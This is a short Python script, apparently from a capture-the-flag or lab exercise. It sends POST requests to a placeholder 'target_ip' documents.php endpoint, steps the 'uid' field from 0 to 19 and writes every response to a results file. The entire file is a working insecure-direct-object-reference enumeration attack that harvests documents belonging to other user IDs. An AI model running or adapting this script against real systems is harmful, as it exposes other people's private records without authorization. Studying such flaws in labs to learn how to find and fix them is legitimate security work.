import requests
url = "http://target_ip/documents.php"
with open("results.txt", "w") as file:
    for i in range(20):
        responce = requests.request(method="POST", url=url, data={"uid": i})
        file.write(f"{responce._content}\n\n")
        print(i)
        